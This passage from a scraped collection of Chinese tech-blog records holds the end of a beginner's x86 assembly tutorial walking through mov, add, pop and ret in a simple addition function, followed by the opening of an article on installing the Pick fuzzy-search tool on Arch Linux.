指令</h3>\n<p><code>mov</code>指令用于将一个值写入某个寄存器。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631b08222456500\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\nmov    %eax, [%esp+8] \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b08222456500-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631b08222456500-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b08222456500-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631b08222456500-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631b08222456500-2\"><span class=\"crayon-v\">mov</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">eax</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">esp</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631b08222456500-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>\n</p></blockquote>\n<p>这一行代码表示，先将 ESP 寄存器里面的地址加上8个字节，得到一个新的地址，然后按照这个地址在 Stack 取出数据。根据前面的步骤，可以推算出这里取出的是<code>2</code>，再将<code>2</code>写入 EAX 寄存器。</p>\n<p>下一行代码也是干同样的事情。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631b0c949311663\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\nmov    %ebx, [%esp+12] \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b0c949311663-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631b0c949311663-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b0c949311663-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631b0c949311663-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631b0c949311663-2\"><span class=\"crayon-v\">mov</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">ebx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">esp</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">12</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631b0c949311663-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>\n</p></blockquote>\n<p>上面的代码将 ESP 寄存器的值加12个字节，再按照这个地址在 Stack 取出数据，这次取出的是<code>3</code>，将其写入 EBX 寄存器。</p>\n<h3>7.5 add 指令</h3>\n<p><code>add</code>指令用于将两个运算子相加，并将结果写入第一个运算子。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631b0f303838853\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\nadd    %eax, %ebx\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b0f303838853-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631b0f303838853-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b0f303838853-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631b0f303838853-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631b0f303838853-2\"><span class=\"crayon-v\">add</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">eax</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">ebx</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631b0f303838853-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>\n</p></blockquote>\n<p>上面的代码将 EAX 寄存器的值（即2）加上 EBX 寄存器的值（即3），得到结果5，再将这个结果写入第一个运算子 EAX 寄存器。</p>\n<h3>7.6 pop 指令</h3>\n<p><code>pop</code>指令用于取出 Stack 最近一个写入的值（即最低位地址的值），并将这个值写入运算子指定的位置。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631b12256943691\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\npop    %ebx\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b12256943691-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631b12256943691-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b12256943691-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631b12256943691-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631b12256943691-2\"><span class=\"crayon-v\">pop</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">ebx</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631b12256943691-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>\n</p></blockquote>\n<p>上面的代码表示，取出 Stack 最近写入的值（即 EBX 寄存器的原始值），再将这个值写回 EBX 寄存器（因为加法已经做完了，EBX 寄存器用不到了）。</p>\n<p>注意，<code>pop</code>指令还会将 ESP 寄存器里面的地址加4，即回收4个字节。</p>\n<h3>7.7 ret 指令</h3>\n<p><code>ret</code>指令用于终止当前函数的执行，将运行权交还给上层函数。也就是，当前函数的帧将被回收。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631b16271171588\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\nret\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b16271171588-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631b16271171588-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b16271171588-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631b16271171588-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631b16271171588-2\"><span class=\"crayon-i\">ret</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631b16271171588-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>\n</p></blockquote>\n<p>可以看到，该指令没有运算子。</p>\n<p>随着<code>add_a_and_b</code>函数终止执行，系统就回到刚才<code>main</code>函数中断的地方，继续往下执行。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631b19198393508\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\nadd    %esp, 8 \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b19198393508-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631b19198393508-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b19198393508-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631b19198393508-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631b19198393508-2\"><span class=\"crayon-v\">add</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">esp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631b19198393508-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>\n</p></blockquote>\n<p>上面的代码表示，将 ESP 寄存器里面的地址，手动加上8个字节，再写回 ESP 寄存器。这是因为 ESP 寄存器的是 Stack 的写入开始地址，前面的<code>pop</code>操作已经回收了4个字节，这里再回收8个字节，等于全部回收。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631b1c580141939\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\nret\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b1c580141939-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631b1c580141939-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b1c580141939-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631b1c580141939-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631b1c580141939-2\"><span class=\"crayon-i\">ret</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631b1c580141939-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>\n</p></blockquote>\n<p>最后，<code>main</code>函数运行结束，<code>ret</code>指令退出程序执行。</p>\n<h2>八、参考链接</h2>\n<ul>\n<li><a href=\"http://kakaroto.homelinux.net/2017/11/introduction-to-reverse-engineering-and-assembly/\">Introduction to reverse engineering and Assembly</a>, by Youness Alaoui</li>\n<li><a href=\"http://www.cs.virginia.edu/~evans/cs216/guides/x86.html\">x86 Assembly Guide</a>, by University of Virginia Computer Science</li>\n</ul>\n<p><!-- /div --></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113509\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113509votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113509\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "2"}
{"tags": "工具与资源", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/7d112f146569e6ad0cf3eb62defddc10.png"], "title": "Pick：一款 Linux 上的命令行模糊搜索工具", "fav_nums": 0, "url": "http://blog.jobbole.com/113480/", "create_date": "2018/01/15", "url_object_id": "d9bc9c062a769388a3915d069b5fe2f3", "comment_nums": 0, "front_image_path": "full/c45857466a0e2dd99c4e857f56ca13903c5eac72.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.ostechnix.com/pick-commandline-fuzzy-search-tool-linux/\">Sk</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9234-1.html\">lujun9972</a>   </div><p>今天，我们要讲的是一款有趣的命令行工具，名叫 Pick。它允许用户通过 ncurses(3X) 界面来从一系列选项中进行选择，而且还支持模糊搜索的功能。当你想要选择某个名字中包含非英文字符的目录或文件时，这款工具就很有用了。你根本都无需学习如何输入非英文字符。借助 Pick，你可以很方便地进行搜索、选择，然后浏览该文件或进入该目录。你甚至无需输入任何字符来过滤文件/目录。这很适合那些有大量目录和文件的人来用。</p>\n<h3 id=\"toc_1\">安装 Pick</h3>\n<p>对 Arch Linux 及其衍生品来说，Pick 放在 <a href=\"https://aur.archlinux.org/packages/pick/\">AUR</a> 中。因此 Arch 用户可以使用类似 <a href=\"https://www.ostechnix.com/install-pacaur-arch-linux/\">Pacaur</a>，<a href=\"https://www.ostechnix.com/install-packer-arch-linux-2/\">Packer</a>，以及 <a href=\"https://www.ostechnix.com/install-yaourt-arch-linux/\">Yaourt</a> 等 AUR 辅助工具来安装它。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec22440569271\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div 